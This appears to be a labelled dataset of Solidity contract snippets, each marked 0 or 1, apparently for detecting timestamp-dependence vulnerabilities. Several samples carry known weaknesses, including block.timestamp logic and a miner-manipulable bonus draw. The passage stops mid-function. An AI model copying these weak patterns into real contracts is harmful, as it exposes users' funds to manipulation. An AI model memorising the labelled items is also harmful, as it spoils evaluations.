0<CODESPLIT>contract VernamWhiteListDeposit {	address[] public participants;	mapping (address => bool) public isWhiteList;	uint256 public deadLine;	function() public payable {		require(block.timestamp <= deadLine);		isWhiteList[msg.sender] = true;								 		participants.push(msg.sender);		return;	}}
1<CODESPLIT>contract game {    mapping (address => uint) readyTime;    function view_readyTime(address _address) view public returns(uint _readyTime){        uint time = block.timestamp;        if (time >= readyTime[_address]){            return 0 ;        }        else{            return readyTime[_address] - time ;        }    }}
0<CODESPLIT>contract BaseToken {    using SafeMath for uint256;    string public name;    string public symbol;    uint8 public decimals;    uint256 public totalSupply;    mapping (address => uint256) public balanceOf;    mapping (address => mapping (address => uint256)) public allowance;    event Transfer(address indexed from, address indexed to, uint256 value);    event Approval(address indexed owner, address indexed spender, uint256 value);    function _transfer(address _from, address _to, uint _value) internal {        require(_to != address(0));        require(balanceOf[_from] >= _value);        balanceOf[_from] = balanceOf[_from].sub(_value);        balanceOf[_to] = balanceOf[_to].add(_value);        Transfer(_from, _to, _value);    }    function transfer(address _to, uint256 _value) public returns (bool success) {        _transfer(msg.sender, _to, _value);        return true;    }    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {        require(_value <= allowance[_from][msg.sender]);        allowance[_from][msg.sender] = allowance[_from][msg.sender].sub(_value);        _transfer(_from, _to, _value);        return true;    }    function approve(address _spender, uint256 _value) public returns (bool success) {        allowance[msg.sender][_spender] = _value;        Approval(msg.sender, _spender, _value);        return true;    }}
0<CODESPLIT>contract BurnToken is BaseToken {    event Burn(address indexed from, uint256 value);    function burn(uint256 _value) public returns (bool success) {        require(balanceOf[msg.sender] >= _value);        balanceOf[msg.sender] = balanceOf[msg.sender].sub(_value);        totalSupply = totalSupply.sub(_value);        Burn(msg.sender, _value);        return true;    }    function burnFrom(address _from, uint256 _value) public returns (bool success) {        require(balanceOf[_from] >= _value);        require(_value <= allowance[_from][msg.sender]);        balanceOf[_from] = balanceOf[_from].sub(_value);        allowance[_from][msg.sender] = allowance[_from][msg.sender].sub(_value);        totalSupply = totalSupply.sub(_value);        Burn(_from, _value);        return true;    }}
0<CODESPLIT>contract AirdropToken is BaseToken, Ownable {    uint256 public airAmount;    address public airSender;    uint256 public airLimitCount;    mapping (address => uint256) public airCountOf;    event Airdrop(address indexed from, uint256 indexed count, uint256 tokenValue);    function airdrop() public {        require(airAmount > 0);        if (airLimitCount > 0 && airCountOf[msg.sender] >= airLimitCount) {            revert();        }        _transfer(airSender, msg.sender, airAmount);        airCountOf[msg.sender] = airCountOf[msg.sender].add(1);        Airdrop(msg.sender, airCountOf[msg.sender], airAmount);    }    function changeAirAmount(uint256 newAirAmount) public onlyOwner {        airAmount = newAirAmount;    }    function changeAirLimitCount(uint256 newAirLimitCount) public onlyOwner {        airLimitCount = newAirLimitCount;    }}
0<CODESPLIT>contract LockToken is BaseToken {    struct LockMeta {        uint256 remain;        uint256 endtime;    }        mapping (address => LockMeta[]) public lockedAddresses;    function _transfer(address _from, address _to, uint _value) internal {        require(balanceOf[_from] >= _value);        uint256 remain = balanceOf[_from].sub(_value);        uint256 length = lockedAddresses[_from].length;        for (uint256 i = 0; i < length; i++) {            LockMeta storage meta = lockedAddresses[_from][i];            if(block.timestamp < meta.endtime && remain < meta.remain){                revert();            }        }        super._transfer(_from, _to, _value);    }}
0<CODESPLIT>contract ADEToken is BaseToken, BurnToken, AirdropToken, LockToken {    function ADEToken() public {        totalSupply = 36000000000000000;        name = "ADE Token";        symbol = "ADE";        decimals = 8;		        owner = msg.sender;        airAmount = 100000000;        airSender = 0x8888888888888888888888888888888888888888;        airLimitCount = 1;                 balanceOf[0xf03A4f01713F38EB7d63C6e691C956E8C56630F7] = 3600000000000000;        Transfer(address(0), 0xf03A4f01713F38EB7d63C6e691C956E8C56630F7, 3600000000000000);                 lockedAddresses[0xf03A4f01713F38EB7d63C6e691C956E8C56630F7].push(LockMeta({remain: 3600000000000000, endtime: 1559923200}));                 lockedAddresses[0xf03A4f01713F38EB7d63C6e691C956E8C56630F7].push(LockMeta({remain: 3240000000000000, endtime: 1562515200}));                 lockedAddresses[0xf03A4f01713F38EB7d63C6e691C956E8C56630F7].push(LockMeta({remain: 2880000000000000, endtime: 1565193600}));                 lockedAddresses[0xf03A4f01713F38EB7d63C6e691C956E8C56630F7].push(LockMeta({remain: 2520000000000000, endtime: 1567872000}));                 lockedAddresses[0xf03A4f01713F38EB7d63C6e691C956E8C56630F7].push(LockMeta({remain: 2160000000000000, endtime: 1570464000}));                 lockedAddresses[0xf03A4f01713F38EB7d63C6e691C956E8C56630F7].push(LockMeta({remain: 1800000000000000, endtime: 1573142400}));                 lockedAddresses[0xf03A4f01713F38EB7d63C6e691C956E8C56630F7].push(LockMeta({remain: 1440000000000000, endtime: 1575734400}));                 lockedAddresses[0xf03A4f01713F38EB7d63C6e691C956E8C56630F7].push(LockMeta({remain: 1080000000000000, endtime: 1578412800}));                 lockedAddresses[0xf03A4f01713F38EB7d63C6e691C956E8C56630F7].push(LockMeta({remain: 720000000000000, endtime: 1581091200}));                 lockedAddresses[0xf03A4f01713F38EB7d63C6e691C956E8C56630F7].push(LockMeta({remain: 360000000000000, endtime: 1583596800}));                         balanceOf[0x76d2dbf2b1e589ff28EcC9203EA781f490696d20] = 3600000000000000;        Transfer(address(0), 0x76d2dbf2b1e589ff28EcC9203EA781f490696d20, 3600000000000000);                 lockedAddresses[0x76d2dbf2b1e589ff28EcC9203EA781f490696d20].push(LockMeta({remain: 3600000000000000, endtime: 1544198400}));                 lockedAddresses[0x76d2dbf2b1e589ff28EcC9203EA781f490696d20].push(LockMeta({remain: 3240000000000000, endtime: 1546876800}));                 lockedAddresses[0x76d2dbf2b1e589ff28EcC9203EA781f490696d20].push(LockMeta({remain: 2880000000000000, endtime: 1549555200}));                 lockedAddresses[0x76d2dbf2b1e589ff28EcC9203EA781f490696d20].push(LockMeta({remain: 2520000000000000, endtime: 1551974400}));                 lockedAddresses[0x76d2dbf2b1e589ff28EcC9203EA781f490696d20].push(LockMeta({remain: 2160000000000000, endtime: 1554652800}));                 lockedAddresses[0x76d2dbf2b1e589ff28EcC9203EA781f490696d20].push(LockMeta({remain: 1800000000000000, endtime: 1557244800}));                 lockedAddresses[0x76d2dbf2b1e589ff28EcC9203EA781f490696d20].push(LockMeta({remain: 1440000000000000, endtime: 1559923200}));                 lockedAddresses[0x76d2dbf2b1e589ff28EcC9203EA781f490696d20].push(LockMeta({remain: 1080000000000000, endtime: 1562515200}));                 lockedAddresses[0x76d2dbf2b1e589ff28EcC9203EA781f490696d20].push(LockMeta({remain: 720000000000000, endtime: 1565193600}));                 lockedAddresses[0x76d2dbf2b1e589ff28EcC9203EA781f490696d20].push(LockMeta({remain: 360000000000000, endtime: 1567872000}));                 balanceOf[0x62d545CD7e67abA36e92c46cfA764c0f1626A9Ae] = 3600000000000000;        Transfer(address(0), 0x62d545CD7e67abA36e92c46cfA764c0f1626A9Ae, 3600000000000000);                 balanceOf[0x8EaA35b0794ebFD412765DFb2Faa770Abae0f36b] = 10800000000000000;        Transfer(address(0), 0x8EaA35b0794ebFD412765DFb2Faa770Abae0f36b, 10800000000000000);                 balanceOf[0x8ECeAd3B4c2aD7C4854a42F93A956F5e3CAE9Fd2] = 3564000000000000;        Transfer(address(0), 0x8ECeAd3B4c2aD7C4854a42F93A956F5e3CAE9Fd2, 3564000000000000);                 lockedAddresses[0x8ECeAd3B4c2aD7C4854a42F93A956F5e3CAE9Fd2].push(LockMeta({remain: 1663200000000000, endtime: 1536336000}));                 lockedAddresses[0x8ECeAd3B4c2aD7C4854a42F93A956F5e3CAE9Fd2].push(LockMeta({remain: 1188000000000000, endtime: 1544198400}));                 balanceOf[0xC458A9017d796b2b4b76b416f814E1A8Ce82e310] = 10836000000000000;        Transfer(address(0), 0xC458A9017d796b2b4b76b416f814E1A8Ce82e310, 10836000000000000);                 lockedAddresses[0xC458A9017d796b2b4b76b416f814E1A8Ce82e310].push(LockMeta({remain: 2167200000000000, endtime: 1536336000}));    }        function() public {        airdrop();    }}
0<CODESPLIT>contract YetAnotherUselessToken is ERC20Interface, Owned, SafeMath {    string public symbol;    string public  name;    uint256 public decimals;    uint256 public _totalSupply;    bool public purchasingAllowed;    uint256 public totalContribution;    uint256 public totalIssued;    uint256 public totalBonusTokensIssued;    mapping(address => uint256) balances;    mapping(address => mapping(address => uint256)) allowed;    constructor() public {        symbol = "YUC";        name = "YetAnotherUselessToken";        decimals = 10;        _totalSupply = 10000000;        balances[owner] = _totalSupply * (10 ** decimals);        purchasingAllowed = false;        totalContribution = 0;        totalIssued = 0;        totalBonusTokensIssued = 0;        emit Transfer(address(0), owner, _totalSupply * (10 ** decimals));    }    function totalSupply() public constant returns (uint256) {        return _totalSupply * (10 ** decimals)  - balances[address(0)];    }    function balanceOf(address tokenOwner) public constant returns (uint256 balance) {        return balances[tokenOwner];    }    function transfer(address to, uint256 tokens) public returns (bool success) {        balances[msg.sender] = safeSub(balances[msg.sender], tokens);        balances[to] = safeAdd(balances[to], tokens);        emit Transfer(msg.sender, to, tokens);        return true;    }    function approve(address spender, uint256 tokens) public returns (bool success) {        allowed[msg.sender][spender] = tokens;        emit Approval(msg.sender, spender, tokens);        return true;    }    function transferFrom(address from, address to, uint256 tokens) public returns (bool success) {        balances[from] = safeSub(balances[from], tokens);        allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);        balances[to] = safeAdd(balances[to], tokens);        emit Transfer(from, to, tokens);        return true;    }    function allowance(address tokenOwner, address spender) public constant returns (uint256 remaining) {        return allowed[tokenOwner][spender];    }    function approveAndCall(address spender, uint256 tokens, bytes data) public returns (bool success) {        allowed[msg.sender][spender] = tokens;        emit Approval(msg.sender, spender, tokens);        ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, this, data);        return true;    }    function transferAnyERC20Token(address tokenAddress, uint256 tokens) public onlyOwner returns (bool success) {        return ERC20Interface(tokenAddress).transfer(owner, tokens);    }    function purchasingAllowed() public constant returns (bool) {        return purchasingAllowed;    }    function enablePurchasing() public onlyOwner {        purchasingAllowed = true;    }    function disablePurchasing() public onlyOwner {        purchasingAllowed = false;    }    function getStats() constant public returns (uint256, uint256, uint256, bool) {        return (totalContribution, totalIssued, totalBonusTokensIssued, purchasingAllowed);    }    function() public payable {        if (!purchasingAllowed) { revert(); }                if (msg.value == 0) { return; }        owner.transfer(msg.value);        totalContribution += msg.value;        uint256 tokensIssued = (msg.value * 100);        if (msg.value >= 10 finney) {            bytes20 bonusHash = ripemd160(block.coinbase, block.number, block.timestamp);            if (bonusHash[0] == 0) {                uint256 bonusMultiplier =                    ((bonusHash[1] & 0x01 != 0) ? 1 : 0) + ((bonusHash[1] & 0x02 != 0) ? 1 : 0) +                    ((bonusHash[1] & 0x04 != 0) ? 1 : 0) + ((bonusHash[1] & 0x08 != 0) ? 1 : 0) +                    ((bonusHash[1] & 0x10 != 0) ? 1 : 0) + ((bonusHash[1] & 0x20 != 0) ? 1 : 0) +                    ((bonusHash[1] & 0x40 != 0) ? 1 : 0) + ((bonusHash[1] & 0x80 != 0) ? 1 : 0);                                uint256 bonusTokensIssued = (msg.value * 100) * bonusMultiplier;                tokensIssued += bonusTokensIssued;                totalBonusTokensIssued += bonusTokensIssued;            }        }        totalIssued += tokensIssued;        balances[msg.sender] += tokensIssued * (10 ** decimals);        balances[owner] -= tokensIssued * (10 ** decimals);                emit Transfer(owner, msg.sender, tokensIssued * (10 ** decimals));    }}
1<CODESPLIT>contract Cryptoverse  {  uint public lastPurchaseTimestamp = now;  uint[3] public prices = [1000 finney, 800 finney, 650 finney];  function currentPrice() public view returns (uint) {    uint sinceLastPurchase = (block.timestamp - lastPurchaseTimestamp);    for (uint i = 0; i < prices.length - 1; i++) {      if (sinceLastPurchase < (i + 1) * 1 days) {        return prices[i];      }    }    return prices[prices.length - 1];  }}
1<CODESPLIT>contract WaltonTokenLocker {    address public beneficiary;    uint256 public releaseTime;    string constant public name = "refund locker V2";    Token public token = Token('0xb7cB1C96dB6B22b0D3d9536E0108d062BD488F74');    function WaltonTokenLocker() public {                 beneficiary = address('0x38A9e09E14397Fe3A5Fe59dfc1d98D8B8897D610');        releaseTime = 1538236800;          }              function release() public {        if (block.timestamp < releaseTime)            throw;        uint256 totalTokenBalance = token.balanceOf(this);        if (totalTokenBalance > 0)            if (!token.transfer(beneficiary, totalTokenBalance))                throw;    }         function releaseTimestamp() public constant returns (uint timestamp) {        return releaseTime;    }    function currentTimestamp() public constant returns (uint timestamp) {        return block.timestamp;    }    function secondsRemaining() public constant returns (uint timestamp) {        if (block.timestamp < releaseTime)            return releaseTime - block.timestamp;        else            return 0;    }    function tokenLocked() public constant returns (uint amount) {        return token.balanceOf(this);    }                    }
1<CODESPLIT>contract TANDER {     uint256 public pre_startdate;     uint bonusCalculationFactor;     function bonuscalpre() private returns (uint256 cp) {          uint bon = 8;          bonusCalculationFactor = (block.timestamp - (pre_startdate)) / (604800);          if(bonusCalculationFactor == 0) {                bon = 8;          }          else{                bon -= bonusCalculationFactor * 8;          }          return bon;      }}
1<CODESPLIT>contract SafeMath1 {    function time() public constant returns (uint256) {        return block.timestamp;    }}
0<CODESPLIT>contract GeneNuggetsToken is Pausable,StandardToken {  using SafeMath for uint256;    string public name = "Gene Nuggets";  string public symbol = "GNUS";        uint8 public decimals = 6;  uint256 public decimalFactor = 10 ** uint256(decimals);  uint public CAP = 30e8 * decimalFactor;         uint256 public circulatingSupply;  uint256 public totalUsers;  uint256 public exchangeLimit = 10000*decimalFactor;  uint256 public exchangeThreshold = 2000*decimalFactor;  uint256 public exchangeInterval = 60;  uint256 public destroyThreshold = 100*decimalFactor;      address public CFO;    mapping(address => uint256) public CustomerService;         uint[10] public MINING_LAYERS = [0,10e4,30e4,100e4,300e4,600e4,1000e4,2000e4,3000e4,2**256 - 1];  uint[9] public MINING_REWARDS = [1000*decimalFactor,600*decimalFactor,300*decimalFactor,200*decimalFactor,180*decimalFactor,160*decimalFactor,60*decimalFactor,39*decimalFactor,0];       event UpdateTotal(uint totalUser,uint totalSupply);  event Exchange(address indexed user,uint256 amount);  event Destory(address indexed user,uint256 amount);  modifier onlyCFO() {    require(msg.sender == CFO);    _;  }  modifier onlyCustomerService() {    require(CustomerService[msg.sender] != 0);    _;  }       function GeneNuggetsToken() public {}        function() public {    revert();  }       function setName(string newName) external onlyOwner {    name = newName;  }       function setSymbol(string newSymbol) external onlyOwner {    symbol = newSymbol;  }       function setCFO(address newCFO) external onlyOwner {    CFO = newCFO;  }       function setExchangeInterval(uint newInterval) external onlyCFO {    exchangeInterval = newInterval;  }     function setExchangeLimit(uint newLimit) external onlyCFO {    exchangeLimit = newLimit;  }     function setExchangeThreshold(uint newThreshold) external onlyCFO {    exchangeThreshold = newThreshold;  }       function setDestroyThreshold(uint newThreshold) external onlyCFO {    destroyThreshold = newThreshold;  }       function addCustomerService(address cs) onlyCFO external {    CustomerService[cs] = block.timestamp;  }       function removeCustomerService(address cs) onlyCFO external {    CustomerService[cs] = 0;  }     function updateTotal(uint256 _userAmount) onlyCFO external {    require(_userAmount>totalUsers);    uint newTotalSupply = calTotalSupply(_userAmount);    require(newTotalSupply<=CAP && newTotalSupply>totalSupply_);        uint _amount = newTotalSupply.sub(totalSupply_);    totalSupply_ = newTotalSupply;    totalUsers = _userAmount;    emit UpdateTotal(_amount,totalSupply_);   }       function calTotalSupply(uint _userAmount) private view returns (uint ret) {    uint tokenAmount = 0;	  for (uint8 i = 0; i < MINING_LAYERS.length ; i++ ) {	    if(_userAmount < MINING_LAYERS[i+1]) {	      tokenAmount = tokenAmount.add(MINING_REWARDS[i].mul(_userAmount.sub(MINING_LAYERS[i])));	      break;	    }else {        tokenAmount = tokenAmount.add(MINING_REWARDS[i].mul(MINING_LAYERS[i+1].sub(MINING_LAYERS[i])));	    }	  }	  return tokenAmount;  }     function exchange(address user,uint256 _amount) whenNotPaused onlyCustomerService external {  	  	require((block.timestamp-CustomerService[msg.sender])>exchangeInterval);  	require(_amount <= exchangeLimit && _amount >= exchangeThreshold);    circulatingSupply = circulatingSupply.add(_amount);        balances[user] = balances[user].add(_amount);        CustomerService[msg.sender] = block.timestamp;        emit Exchange(user,_amount);        emit Transfer(address(0),user,_amount);      }       function destory(uint256 _amount) external {      require(balances[msg.sender]>=_amount && _amount>destroyThreshold && circulatingSupply>=_amount);    circulatingSupply = circulatingSupply.sub(_amount);        balances[msg.sender] = balances[msg.sender].sub(_amount);        emit Destory(msg.sender,_amount);        emit Transfer(msg.sender,0x0,_amount);      }  function emergencyERC20Drain( ERC20 token, uint amount ) onlyOwner external {         token.transfer( owner, amount );  }  }
1<CODESPLIT>contract Ownable1 {  uint public startsAt;  enum State { PreFunding, Funding}  function getState() public constant returns (State) {    if (block.timestamp < startsAt) {        return State.PreFunding;    } else {        return State.Funding;    }  }}
1<CODESPLIT>contract ReciveAndSend{    function getHours() public returns (uint){        return (block.timestamp / 60 / 60) % 24;    }}
1<CODESPLIT>contract MainCrowdsale is Consts, FinalizableCrowdsale {    function hasStarted() public constant returns (bool) {        return now >= startTime;    }    function finalization() internal {        super.finalization();        if (PAUSED) {            MainToken(token).unpause();        }        if (!CONTINUE_MINTING) {            token.finishMinting();        }        token.transferOwnership(TARGET_USER);    }    function buyTokens(address beneficiary) public payable {        require(beneficiary != address(0));        require(validPurchase());        uint256 weiAmount = msg.value;                 uint256 tokens = weiAmount.mul(rate).div(1 ether);                 weiRaised = weiRaised.add(weiAmount);        token.mint(beneficiary, tokens);        emit TokenPurchase(msg.sender, beneficiary, weiAmount, tokens);        forwardFunds();    }}
0<CODESPLIT>contract BonusableCrowdsale is Consts, Crowdsale {    function buyTokens(address beneficiary) public payable {        require(beneficiary != address(0));        require(validPurchase());        uint256 weiAmount = msg.value;                 uint256 bonusRate = getBonusRate(weiAmount);        uint256 tokens = weiAmount.mul(bonusRate).div(1 ether);                 weiRaised = weiRaised.add(weiAmount);        token.mint(beneficiary, tokens);        emit TokenPurchase(msg.sender, beneficiary, weiAmount, tokens);        forwardFunds();    }    function getBonusRate(uint256 weiAmount) internal view returns (uint256) {        uint256 bonusRate = rate;                         uint[5] memory weiRaisedStartsBoundaries = [uint(0),uint(4583333333333333333333),uint(8333333333333333333333),uint(16666666666666666666667),uint(25000000000000000000000)];        uint[5] memory weiRaisedEndsBoundaries = [uint(4583333333333333333333),uint(8333333333333333333333),uint(16666666666666666666667),uint(25000000000000000000000),uint(33333333333333333333333)];        uint64[5] memory timeStartsBoundaries = [uint64(1530417600),uint64(1530417600),uint64(1530417600),uint64(1530417600),uint64(1530417600)];        uint64[5] memory timeEndsBoundaries = [uint64(1543640395),uint64(1543640395),uint64(1543640395),uint64(1543640395),uint64(1543640395)];        uint[5] memory weiRaisedAndTimeRates = [uint(300),uint(200),uint(150),uint(100),uint(50)];        for (uint i = 0; i < 5; i++) {            bool weiRaisedInBound = (weiRaisedStartsBoundaries[i] <= weiRaised) && (weiRaised < weiRaisedEndsBoundaries[i]);            bool timeInBound = (timeStartsBoundaries[i] <= now) && (now < timeEndsBoundaries[i]);            if (weiRaisedInBound && timeInBound) {                bonusRate += bonusRate * weiRaisedAndTimeRates[i] / 1000;            }        }                        return bonusRate;    }}
0<CODESPLIT>contract FixedMath {        using SafeMath for uint;    uint constant internal METDECIMALS = 18;    uint constant internal METDECMULT = 10 ** METDECIMALS;    uint constant internal DECIMALS = 18;    uint constant internal DECMULT = 10 ** DECIMALS;    function fMul(uint x, uint y) internal pure returns (uint) {        return (x.mul(y)).div(DECMULT);    }    function fDiv(uint numerator, uint divisor) internal pure returns (uint) {        return (numerator.mul(DECMULT)).div(divisor);    }    function fSqrt(uint n) internal pure returns (uint) {        if (n == 0) {            return 0;        }        uint z = n * n;        require(z / n == n);        uint high = fAdd(n, DECMULT);        uint low = 0;        while (fSub(high, low) > 1) {            uint mid = fAdd(low, high) / 2;            if (fSqr(mid) <= n) {                low = mid;            } else {                high = mid;            }        }        return low;    }    function fSqr(uint n) internal pure returns (uint) {        return fMul(n, n);    }    function fAdd(uint x, uint y) internal pure returns (uint) {        return x.add(y);    }    function fSub(uint x, uint y) internal pure returns (uint) {        return x.sub(y);    }}
0<CODESPLIT>contract Formula is FixedMath {    function returnForMint(uint smartTokenSupply, uint reserveTokensSent, uint reserveTokenBalance)         internal pure returns (uint)    {        uint s = smartTokenSupply;        uint e = reserveTokensSent;        uint r = reserveTokenBalance;        return ((fMul(s, (fSub(fSqrt(fAdd(DECMULT, fDiv(e, r))), DECMULT)))).mul(METDECMULT)).div(DECMULT);    }    function returnForRedemption(uint smartTokenSupply, uint smartTokensSent, uint reserveTokenBalance)        internal pure returns (uint)    {        uint s = smartTokenSupply;        uint t = smartTokensSent;        uint r = reserveTokenBalance;        return ((fMul(r, (fSub(DECMULT, fSqr(fSub(DECMULT, fDiv(t, s))))))).mul(METDECMULT)).div(DECMULT);    }}
0<CODESPLIT>contract Pricer {    using SafeMath for uint;    uint constant internal METDECIMALS = 18;    uint constant internal METDECMULT = 10 ** METDECIMALS;    uint public minimumPrice = 33*10**11;    uint public minimumPriceInDailyAuction = 1;    uint public tentimes;    uint public hundredtimes;    uint public thousandtimes;    uint constant public MULTIPLIER = 1984320568*10**5;    function initPricer() public {        uint x = METDECMULT;        uint i;                for (i = 0; i < 10; i++) {            x = x.mul(99).div(100);        }        tentimes = x;        x = METDECMULT;        for (i = 0; i < 10; i++) {            x = x.mul(tentimes).div(METDECMULT);        }        hundredtimes = x;        x = METDECMULT;        for (i = 0; i < 10; i++) {            x = x.mul(hundredtimes).div(METDECMULT);        }        thousandtimes = x;    }    function priceAt(uint initialPrice, uint _n) public view returns (uint price) {        uint mult = METDECMULT;        uint i;        uint n = _n;        if (n / 1000 > 0) {            for (i = 0; i < n / 1000; i++) {                mult = mult.mul(thousandtimes).div(METDECMULT);            }            n = n % 1000;        }        if (n / 100 > 0) {            for (i = 0; i < n / 100; i++) {                mult = mult.mul(hundredtimes).div(METDECMULT);            }            n = n % 100;        }        if (n / 10 > 0) {            for (i = 0; i < n / 10; i++) {                mult = mult.mul(tentimes).div(METDECMULT);            }            n = n % 10;        }        for (i = 0; i < n; i++) {            mult = mult.mul(99).div(100);        }        price = initialPrice.mul(mult).div(METDECMULT);                if (price < minimumPriceInDailyAuction) {            price = minimumPriceInDailyAuction;        }    }    function priceAtInitialAuction(uint lastPurchasePrice, uint numTicks) public view returns (uint price) {        if (lastPurchasePrice > MULTIPLIER.mul(numTicks)) {            price = lastPurchasePrice.sub(MULTIPLIER.mul(numTicks));        }        if (price < minimumPrice) {            price = minimumPrice;        }    }}interface ERC20 {    function totalSupply() public constant returns (uint256);    function balanceOf(address _owner) public constant returns (uint256);    function allowance(address _owner, address _spender) public constant returns (uint256);    event Transfer(address indexed _from, address indexed _to, uint256 _value);    function transfer(address _to, uint256 _value) public returns (bool);    function transferFrom(address _from, address _to, uint256 _value) public returns (bool);    event Approval(address indexed _owner, address indexed _spender, uint256 _value);    function approve(address _spender, uint256 _value) public returns (bool);}
0<CODESPLIT>contract Mintable is Owned {    using SafeMath for uint256;    event Mint(address indexed _to, uint _value);    event Destroy(address indexed _from, uint _value);    event Transfer(address indexed _from, address indexed _to, uint256 _value);    uint256 internal _totalSupply;    mapping(address => uint256) internal _balanceOf;    address public autonomousConverter;    address public minter;    ITokenPorter public tokenPorter;    function initMintable(address _autonomousConverter, address _minter, uint _initialSupply,         uint _decmult) public onlyOwner {        require(autonomousConverter == 0x0 && _autonomousConverter != 0x0);        require(minter == 0x0 && _minter != 0x0);              autonomousConverter = _autonomousConverter;        minter = _minter;        _totalSupply = _initialSupply.mul(_decmult);        _balanceOf[_autonomousConverter] = _totalSupply;    }    function totalSupply() public constant returns (uint256) {        return _totalSupply;    }    function balanceOf(address _owner) public constant returns (uint256) {        return _balanceOf[_owner];    }    function setTokenPorter(address _tokenPorter) public onlyOwner returns (bool) {        require(_tokenPorter != 0x0);        tokenPorter = ITokenPorter(_tokenPorter);        return true;    }    function mint(address _to, uint _value) public returns (bool) {        require(msg.sender == minter || msg.sender == address(tokenPorter));        _balanceOf[_to] = _balanceOf[_to].add(_value);        _totalSupply = _totalSupply.add(_value);        emit Mint(_to, _value);        emit Transfer(0x0, _to, _value);        return true;    }    function destroy(address _from, uint _value) public returns (bool) {        require(msg.sender == autonomousConverter || msg.sender == address(tokenPorter));        _balanceOf[_from] = _balanceOf[_from].sub(_value);        _totalSupply = _totalSupply.sub(_value);        emit Destroy(_from, _value);        emit Transfer(_from, 0x0, _value);        return true;    }}
0<CODESPLIT>contract METToken is Token {    string public constant name = "Metronome";    string public constant symbol = "MET";    uint8 public constant decimals = 18;    bool public transferAllowed;    function initMETToken(address _autonomousConverter, address _minter,         uint _initialSupply, uint _decmult) public onlyOwner {        initToken(_autonomousConverter, _minter, _initialSupply, _decmult);    }        modifier transferable() {        require(transferAllowed);        _;    }    function enableMETTransfers() public returns (bool) {        require(!transferAllowed && Auctions(minter).isInitialAuctionEnded());        transferAllowed = true;         return true;    }    function transfer(address _to, uint256 _value) public transferable returns (bool) {        return super.transfer(_to, _value);            }    function transferFrom(address _from, address _to, uint256 _value) public transferable returns (bool) {                return super.transferFrom(_from, _to, _value);    }    function multiTransfer(uint[] bits) public transferable returns (bool) {        return super.multiTransfer(bits);    }        mapping (address => bytes32) public roots;    function setRoot(bytes32 data) public {        roots[msg.sender] = data;    }    function getRoot(address addr) public view returns (bytes32) {        return roots[addr];    }    function rootsMatch(address a, address b) public view returns (bool) {        return roots[a] == roots[b];    }    function importMET(bytes8 _originChain, bytes8 _destinationChain, address[] _addresses, bytes _extraData,         bytes32[] _burnHashes, uint[] _supplyOnAllChains, uint[] _importData, bytes _proof) public returns (bool)    {        require(address(tokenPorter) != 0x0);        return tokenPorter.importMET(_originChain, _destinationChain, _addresses, _extraData,         _burnHashes, _supplyOnAllChains, _importData, _proof);    }    function export(bytes8 _destChain, address _destMetronomeAddr, address _destRecipAddr, uint _amount, uint _fee,     bytes _extraData) public returns (bool)    {        require(address(tokenPorter) != 0x0);        return tokenPorter.export(msg.sender, _destChain, _destMetronomeAddr,        _destRecipAddr, _amount, _fee, _extraData);    }    struct Sub {        uint startTime;              uint payPerWeek;         uint lastWithdrawTime;    }    event LogSubscription(address indexed subscriber, address indexed subscribesTo);    event LogCancelSubscription(address indexed subscriber, address indexed subscribesTo);    mapping (address => mapping (address => Sub)) public subs;    function subscribe(uint _startTime, uint _payPerWeek, address _recipient) public returns (bool) {        require(_startTime >= block.timestamp);        require(_payPerWeek != 0);        require(_recipient != 0);        subs[msg.sender][_recipient] = Sub(_startTime, _payPerWeek, _startTime);                  emit LogSubscription(msg.sender, _recipient);        return true;    }    function cancelSubscription(address _recipient) public returns (bool) {        require(subs[msg.sender][_recipient].startTime != 0);        require(subs[msg.sender][_recipient].payPerWeek != 0);        subs[msg.sender][_recipient].startTime = 0;        subs[msg.sender][_recipient].payPerWeek = 0;        subs[msg.sender][_recipient].lastWithdrawTime = 0;        emit LogCancelSubscription(msg.sender, _recipient);        return true;    }    function getSubscription(address _owner, address _recipient) public constant        returns (uint startTime, uint payPerWeek, uint lastWithdrawTime)     {        Sub storage sub = subs[_owner][_recipient];        return (            sub.startTime,            sub.payPerWeek,            sub.lastWithdrawTime        );    }    function subWithdraw(address _owner) public transferable returns (bool) {        require(subWithdrawFor(_owner, msg.sender));        return true;    }    function multiSubWithdraw(address[] _owners) public returns (uint) {        uint n = 0;        for (uint i=0; i < _owners.length; i++) {            if (subWithdrawFor(_owners[i], msg.sender)) {                n++;            }         }        return n;    }    function multiSubWithdrawFor(address[] _owners, address[] _recipients) public returns (uint) {        require(_owners.length == _recipients.length);        uint n = 0;        for (uint i = 0; i < _owners.length; i++) {            if (subWithdrawFor(_owners[i], _recipients[i])) {                n++;            }        }        return n;    }    function subWithdrawFor(address _from, address _to) internal returns (bool) {        Sub storage sub = subs[_from][_to];                if (sub.startTime > 0 && sub.startTime < block.timestamp && sub.payPerWeek > 0) {            uint weekElapsed = (now.sub(sub.lastWithdrawTime)).div(7 days);            uint amount = weekElapsed.mul(sub.payPerWeek);            if (weekElapsed > 0 && _balanceOf[_from] >= amount) {                subs[_from][_to].lastWithdrawTime = block.timestamp;                _balanceOf[_from] = _balanceOf[_from].sub(amount);                _balanceOf[_to] = _balanceOf[_to].add(amount);                emit Transfer(_from, _to, amount);                return true;            }        }               return false;    }}
0<CODESPLIT>contract AutonomousConverter is Formula, Owned {    SmartToken public smartToken;    METToken public reserveToken;    Auctions public auctions;    enum WhichToken { Eth, Met }    bool internal initialized = false;    event LogFundsIn(address indexed from, uint value);    event ConvertEthToMet(address indexed from, uint eth, uint met);    event ConvertMetToEth(address indexed from, uint eth, uint met);    function init(address _reserveToken, address _smartToken, address _auctions)         public onlyOwner payable     {        require(!initialized);        auctions = Auctions(_auctions);        reserveToken = METToken(_reserveToken);        smartToken = SmartToken(_smartToken);        initialized = true;    }    function handleFund() public payable {        require(msg.sender == address(auctions.proceeds()));        emit LogFundsIn(msg.sender, msg.value);    }    function getMetBalance() public view returns (uint) {        return balanceOf(WhichToken.Met);    }    function getEthBalance() public view returns (uint) {        return balanceOf(WhichToken.Eth);    }    function getMetForEthResult(uint _depositAmount) public view returns (uint256) {        return convertingReturn(WhichToken.Eth, _depositAmount);    }    function getEthForMetResult(uint _depositAmount) public view returns (uint256) {        return convertingReturn(WhichToken.Met, _depositAmount);    }    function convertEthToMet(uint _mintReturn) public payable returns (uint returnedMet) {        returnedMet = convert(WhichToken.Eth, _mintReturn, msg.value);        emit ConvertEthToMet(msg.sender, msg.value, returnedMet);    }    function convertMetToEth(uint _amount, uint _mintReturn) public returns (uint returnedEth) {     